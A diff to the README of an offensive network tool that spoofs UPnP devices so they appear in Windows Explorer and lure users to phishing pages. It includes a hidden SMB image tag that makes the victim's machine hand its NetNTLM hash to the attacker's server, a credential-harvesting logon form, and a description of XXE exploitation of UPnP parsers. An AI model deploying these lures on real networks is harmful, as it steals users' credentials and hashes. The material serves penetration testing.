@@ -1,13 +1,13 @@
 # Overview
-This tool responds to SSDP multicast discover requests, posing as a generic UPNP device on a local network. Your spoofed device will magically appear in Windows Explorer on machines in your local network. Users who are tempted to open the device are shown a configurable webpage. By default, this page will load a hidden image over SMB, allowing you to capture or relay the NetNTLM challenge/response.
+This tool responds to SSDP multicast discover requests, posing as a generic UPNP device. Your spoofed device will magically appear in Windows Explorer on machines in your local network. Users who are tempted to open the device are shown a configurable phishing page. This page can load a hidden image over SMB, allowing you to capture or relay the NetNTLM challenge/response.
 
 Templates are also provided to capture clear-text credentials via basic authentication and logon forms, and creating your own custom templates is quick and easy.
 
-This works against all modern Operating Systems (including Windows 10 even if they have disabled NETBIOS and LLMNR) and requires no existing credentials to execute.
+This requires no existing credentials to execute and works even on networks that have protected against Responder attacks by disabling NETBIOS and LLMNR. Any Operating System or application leveraging SSDP/UPNP can be targeted, but most of the current weaponization has been aimed at Windows 10.
 
 ![Demo Video](ssdp.mp4)
 
-As a bonus, this tool can also detect and exploit potential zero-day vulnerabilities in the XML parsing engines of applications using SSDP/UPNP. To try this, use the 'xxe-smb' template. If a vulnerable device is found, it will alert you in the UI and then mount your SMB share with NO USER INTERACTION required via an XML External Entity (XXE) attack. 
+As a bonus, this tool can also detect and exploit potential zero-day vulnerabilities in the XML parsing engines of applications using SSDP/UPNP. If a vulnerable device is found, it will alert you in the UI and then mount your SMB share with NO USER INTERACTION REQUIRED via an XML External Entity (XXE) attack. 
 
 # Usage
 The most basic run looks like this:
@@ -20,14 +20,11 @@ You need to provide the network interface at a minimum. The interface is used fo
 
 The tool will automatically inject an IMG tag into the phishing page using the IP of the interface you provide. To work with hashes, you'll need to launch an SMB server at that interface (like Impacket). This address can be customized with the `-s` option. 
 
-You do NOT need to edit the variables in the template files - the tool will do this automatically.
-
-You can choose between the included templates in the "templates" folder or build your own simply by duplicating an existing folder and editing the files inside. This allows you to customize the device name, the phishing contents page, or even build a totally new type of UPNP device that I haven't created yet.
-
 Some example scenarios:
 
 ```
-# Use wlan0 for device advertisement and phishing, capturing NetNTLM and hoping for clear-text with Office365 spoof:
+# Use wlan0 for device advertisement and phishing, capturing NetNTLM and asking for clear-text
+# via a spoofed Office365 logon form:
 essdp.py wlan0 -t office365
 
 # Same as above, but assuming your SMB server is running on another IP:
@@ -70,7 +67,7 @@ optional arguments:
 # Templates
 The following templates come with the tool. If you have good design skills, please contribute one of your own!
 
-- `office365`:          Will show up in Windows Explorer as "Office365 Backups". Will send to a nice looking phishing page that will POST credentials back. These will be flagged in the UI and logged in the log file. Will redirect back to the phishing page after POST. Future improvement might be to redirect to actual Office365. Developer: [pentestgeek](https://github.com/pentestgeek/phishing-frenzy-templates).
+- `office365`:          Will show up in Windows Explorer as "Office365 Backups". Phishing page looking like Office365 logon will POST credentials back. These will be flagged in the UI and logged in the log file. Will redirect back to the phishing page after POST. Future improvement might be to redirect to actual Office365. Developer: [pentestgeek](https://github.com/pentestgeek/phishing-frenzy-templates).
 - `microsft-azure`:     Will appear in Windows Explorer as "Microsoft Azure Storage". Landing page is the Windows Live login page when cookies are disabled. Recommend to use with the -u option to redirect users to real login page. Developer: [Dwight Hohnstein](https://github.com/djhohnstein).
 - `bitcoin`:            Will show up in Windows Explorer as "Bitcoin Wallet". Phishing page is just a random set of Bitcoin private/public/address info. There are no actual funds in these accounts.
 - `password-vault`:     Will show up in Windows Explorer as "IT Password Vault". Phishing page contains a short list of fake passwords / ssh keys / etc.
@@ -85,15 +82,20 @@ Creating your own templates is easy. Simply copy the folder of an existing templ
 In your phishing page (`present.html`), use variables like the following for additional functionality:
 
 ```
-# The following line will initiate a NetNTLM challenge/response using the IP address of either the interface you provide or an optionally specified IP address:
+# The following line will initiate a NetNTLM challenge/response using the IP address of either the interface
+# you provide or an optionally specified IP address:
 <img src="file://///$smbServer/smb/hash.jpg" style="display: none;" />
 
-# The following line will leverage an optionally specified URL redirection. This is handy for when used with optional basic authentication to then redirect to a valid site. This line is built in to the microsoft-azure template
+# The following line will leverage optionally specified URL redirection. This is handy for when used with
+# basic authentication to redirect to a valid site. This line is built in to the microsoft-azure template:
 <img src="file://///$smbServer/smb/hash.jpg" style="display: none;" />
 
-# If using an HTTP form to capture clear-text credentials, use code like the following. The tool will monitor POSTs to this URL for credentials:
+# If using an HTTP form to capture clear-text credentials, use code like the following. The tool will monitor
+# POSTs to this URL for credentials:
 <form method="POST" action="/ssdp/do_login.html" name="LoginForm" autocomplete="off">
 ```
+
+The tool currently only correctly creates devices for the UPNP 'rootdevice' device type, although it is responding to the SSDP queries for all devices types. If you know UPNP well, you can create a new template with the correct parameters to fufill requests for other device types as well. There is still a lot to explore here with exploiting specific applications and the way they expect and leverage UPNP devices.
 
 # Technical Details
 Simple Service Discovery Protocol (SSDP) is used by Operating Systems (Windows, MacOS, Linux, IOS, Android, etc) and applications (Spotify, Youtube, etc) to discover shared devices on a local network. It is the foundation for discovering and advertising Universal Plug & Play (UPNP) devices.
@@ -188,10 +190,6 @@ This is accomplished by providing a Device Descriptor XML file with the followin
 
 When a vulnerable XML parser reads this file, it will automatically mount the SMB share (allowing you to crack the hash or relay) as well as access an HTTP URL to notify you it was discovered. The notification will contain the HTTP headers and an IP address, which should give you some info on the vulnerable application. If you see this, please do contact the vendor to fix the issue. Also, I would love to hear about any zero days you find using the tool. And please do mention the tool in your CVE.
 
-# Customization
-This is an early beta, but constructed in such a way to allow easy template creation in the future. I've included two very basic templates - simply duplicate a template folder and customize for your own use. Then use the '-t' parameter to choose your new template.
-
-The tool currently only correctly creates devices for the UPNP 'rootdevice' device type, although it is responding to the SSDP queries for all devices types. If you know UPNP well, you can create a new template with the correct parameters to fufill requests for other device types as well.
 
 # Thanks
 Thanks to ZeWarren and his project [here](https://github.com/ZeWaren/python-upnp-ssdp-example). I used this extensively to understand how to get the basics for SSDP working.
